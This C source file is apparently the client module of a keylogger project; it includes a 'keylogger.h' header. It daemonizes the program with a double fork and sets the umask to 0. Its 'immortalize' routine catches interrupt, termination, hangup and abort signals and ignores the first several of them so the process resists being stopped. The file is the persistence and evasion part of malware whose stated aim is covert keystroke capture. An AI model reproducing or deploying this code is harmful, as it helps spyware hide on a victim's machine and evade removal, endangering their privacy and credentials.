/**
 * Client side of server.
 */
#include "client.h"
#include "keylogger.h"
#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <unistd.h>


//Signal counter needs to be a global variable so that it is accessible
//by the signal handler function. It cannot be constant
// NOLINTNEXTLINE
int signal_counter = 0;

void background_process(void) {
  
  //All exits are not linted just like they are in the softsys assignments

//process line
  //lwitten     5523  0.0  0.0   2772    96 ?        S    17:05   0:00 ./src/main

//instructions for killing the program from command line
//sudo kill -SIGNAL_CODE P_ID
//-9 for kill, -2 for int
//sudo kill -9 -- -GROUPID

  printf("Begin Backgrounding 1\n");

  int process_id = fork();

  if (process_id == -1){
    perror("Failed to fork Process\n");
    //printf("failed to fork 1\n");
    //status 1 is an error
    // NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(errno);
  }
  else if (process_id > 0){
    //successfully exit parent process

    printf("parent exiting\n");
    // NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(0);
  }

  //redirect signals
  immortalize();

  //fork again?
  //printf("backgrounding complete 5\n");
  process_id = fork();

    if (process_id == -1){
    perror("Failed to fork Process\n");
    //status 1 is an error
    // NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(errno);
  }
    else if (process_id > 0){
    //successfully exit parent process
    printf("killing parent");
    //raise(SIGKILL);
    // NOLINTNEXTLINE(concurrency-mt-unsafe)
    exit(0);
    //this is intentional error checking code and should remain althought unreachable
    // NOLINTNEXTLINE(clang-diagnostic-unreachable-code)
    perror("this should not be viewable");
  }
  //change working directory to root

  //Not linted as successful forking is checked and so will remain safe 
  //and only accessible by one process
  // NOLINTNEXTLINE(concurrency-mt-unsafe)
  char* path = getenv("HOME");

  if( path != NULL){
    (void)chdir(path);
  }


  //set umask to 0
  umask(0);
  //signal handle again for the new process
  immortalize();
  // NOLINTNEXTLINE(concurrency-mt-unsafe)
  //printf("backgrounding complete\n");
}

void immortalize(void){

    //Redirect common abort/termination/interrupt signals to ignores

    //int* signal_counter  = malloc(sizeof(int));
    (void)signal(SIGINT,shutdown_signal);
    (void)signal(SIGTERM,shutdown_signal);
    (void)signal(SIGHUP,shutdown_signal);
    (void)signal(SIGABRT,shutdown_signal);
}

//signal handling function
//not linting the next line as Clang dislikes that signal is not used,
//but an integer argument is required for signal handling functions

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wunused-parameter"
// NOLINTNEXTLINE
void shutdown_signal(int signal){ 
#pragma GCC diagnostic pop
  //global variable signal_counter defined above

  //on 5th actually shutdown
  if(signal_counter > 4){
    //I am not linting this line as it should be asynchronous safe since 
    //raising SIGKILL should only be able to be called once

    // NOLINTNEXTLINE(bugprone-signal-handler,cert-sig30-c)
    printf("Ending Program");
    (void)raise(SIGKILL);
    printf("Error Killing Program");
  }
  signal_counter++;
  printf("Shutdown Signal Blocked");
}


